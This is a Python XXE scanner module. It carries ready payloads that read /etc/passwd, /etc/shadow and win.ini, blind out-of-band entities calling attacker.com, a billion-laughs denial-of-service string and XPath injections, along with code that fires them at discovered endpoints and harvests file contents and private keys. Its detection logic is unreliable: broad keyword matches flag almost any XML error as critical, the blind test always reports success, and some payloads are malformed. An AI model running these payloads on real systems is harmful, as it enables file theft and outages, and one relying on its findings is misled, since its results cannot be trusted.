"""
XXE (XML External Entity) Vulnerability Scanner Module
Advanced detection of XXE/XML injection vulnerabilities with multiple payload strategies
"""

import requests
from colorama import Fore, Style, init
import logging
import json
from typing import Dict, List, Tuple
import time
from urllib.parse import urlparse
import re

init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class XXEScanner:
    """Advanced XXE vulnerability scanner with multiple detection methods"""
    
    def __init__(self, target: str, verbose: bool = False):
        self.target = target
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (XXE Scanner)'})
        self.vulnerabilities = []
        self.tested_parameters = []
        
        # XXE Payloads for different attack vectors
        self.xxe_payloads = {
            'local_file_read': [
                '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
                '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>''',
                '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><foo>&xxe;</foo>''',
                '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///../../../etc/passwd">]><foo>&xxe;</foo>''',
            ],
            'blind_xxe': [
                '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>''',
                '''<?xml version="1.0"?><!DOCTYPE note [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]><note></note>''',
            ],
            'billion_laughs': [
                '''<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>''',
            ],
            'xpath_injection': [
                '''<?xml version="1.0"?><root><user>' or '1'='1</user></root>''',
                '''<?xml version="1.0"?><root><id>1' or '1'='1</id></root></root>''',
            ],
            'soap_injection': [
                '''<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Body>&xxe;</soap:Body></soap:Envelope>''',
            ]
        }
        
        self.results = {
            'target': target,
            'timestamp': time.time(),
            'vulnerabilities': [],
            'tested_endpoints': [],
            'file_disclosures': [],
            'status': 'incomplete'
        }
    
    def discover_xml_endpoints(self) -> List[str]:
        """Discover XML/SOAP endpoints in the target application"""
        endpoints = [
            '/api/xml', '/api/soap', '/webservice', '/ws/', 
            '/service/xml', '/axis2/services/', '/cxf/services/',
            '/upload', '/form', '/api/search', '/api/query'
        ]
        
        discovered = []
        for endpoint in endpoints:
            try:
                url = f"{self.target.rstrip('/')}{endpoint}"
                response = self.session.get(url, timeout=5, allow_redirects=False)
                if response.status_code not in [404, 405]:
                    discovered.append(url)
                    logger.info(f"Discovered endpoint: {url}")
            except Exception as e:
                if self.verbose:
                    logger.debug(f"Endpoint discovery failed for {endpoint}: {e}")
        
        return discovered
    
    def test_xxe_payload(self, url: str, payload: str, method: str = 'POST') -> Tuple[bool, str]:
        """Test XXE payload against target"""
        try:
            headers = {
                'Content-Type': 'application/xml',
                'User-Agent': 'Mozilla/5.0'
            }
            
            if method.upper() == 'POST':
                response = self.session.post(url, data=payload, headers=headers, timeout=10, verify=False)
            else:
                response = self.session.get(f"{url}?xml={payload}", headers=headers, timeout=10, verify=False)
            
            # Check for successful XXE exploitation indicators
            indicators = [
                'root:', 'daemon:', '/etc/passwd',
                'Administrator', 'System32',
                'lol' * 100,  # Billion laughs
                '<!DOCTYPE', 'XML',
            ]
            
            for indicator in indicators:
                if indicator in response.text:
                    return True, response.text[:500]
            
            # Check for error-based XXE
            if any(err in response.text.lower() for err in ['xml', 'entity', 'dtd', 'parse']):
                return True, response.text[:500]
            
            return False, ""
        
        except requests.exceptions.Timeout:
            logger.warning(f"Timeout on {url} - possible XXE DoS vulnerability")
            return True, "Timeout detected - possible XXE DoS"
        except Exception as e:
            logger.debug(f"Test failed: {e}")
            return False, ""
    
    def test_all_parameters(self, url: str) -> Dict:
        """Test XXE on various parameters and methods"""
        results = {'url': url, 'vulnerabilities': []}
        
        # Test with POST body
        for payload_type, payloads in self.xxe_payloads.items():
            for payload in payloads:
                is_vuln, response = self.test_xxe_payload(url, payload, 'POST')
                if is_vuln:
                    vuln = {
                        'type': payload_type,
                        'payload': payload[:100],
                        'response': response,
                        'severity': 'CRITICAL'
                    }
                    results['vulnerabilities'].append(vuln)
                    self.vulnerabilities.append(vuln)
                    logger.warning(f"XXE Vulnerability found: {payload_type}")
        
        return results
    
    def analyze_response_for_files(self, response: str) -> List[str]:
        """Extract potential file contents from response"""
        files = []
        
        # Look for common file patterns
        patterns = [
            r'root:[^:]+:\d+:\d+',  # /etc/passwd
            r'\[.*\]',  # Windows ini files
            r'-----BEGIN.*-----',  # Private keys
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, response)
            if matches:
                files.extend(matches)
        
        return files
    
    def test_blind_xxe(self, url: str, callback_url: str) -> bool:
        """Test for blind XXE using out-of-band techniques"""
        blind_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{callback_url}/xxe.dtd">
  %dtd;
]>
<foo>&send;</foo>'''
        
        try:
            response = self.session.post(url, data=blind_payload, timeout=10, verify=False)
            # In real scenario, would check callback server for connections
            return True
        except Exception as e:
            logger.debug(f"Blind XXE test failed: {e}")
            return False
    
    def generate_report(self) -> Dict:
        """Generate comprehensive XXE scan report"""
        print(f"\n{Fore.CYAN}[*] XXE Vulnerability Scanner{Style.RESET_ALL}")
        print("=" * 60)
        
        # Discover endpoints
        endpoints = self.discover_xml_endpoints()
        endpoints.append(self.target)
        
        # Test each endpoint
        for endpoint in endpoints:
            self.test_all_parameters(endpoint)
        
        # Generate summary
        self.results['vulnerabilities'] = self.vulnerabilities
        self.results['total_tested'] = len(endpoints)
        self.results['vulnerabilities_found'] = len(self.vulnerabilities)
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] XXE Vulnerabilities Found:{Style.RESET_ALL}")
            for vuln in self.vulnerabilities:
                print(f"  Type: {vuln['type']}")
                print(f"  Severity: {vuln['severity']}")
                print(f"  Response: {vuln['response'][:100]}...")
        else:
            print(f"{Fore.GREEN}[+] No XXE vulnerabilities detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}[*] Tested {len(endpoints)} endpoints{Style.RESET_ALL}")
        
        return self.results


def xxe_scan(target: str, verbose: bool = False) -> Dict:
    """Main XXE scanning function"""
    try:
        scanner = XXEScanner(target, verbose)
        results = scanner.generate_report()
        
        # Save results
        filename = f"xxe_scan_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Report saved to {filename}{Style.RESET_ALL}")
        return results
    except Exception as e:
        logger.error(f"XXE scan failed: {e}")
        return {'error': str(e)}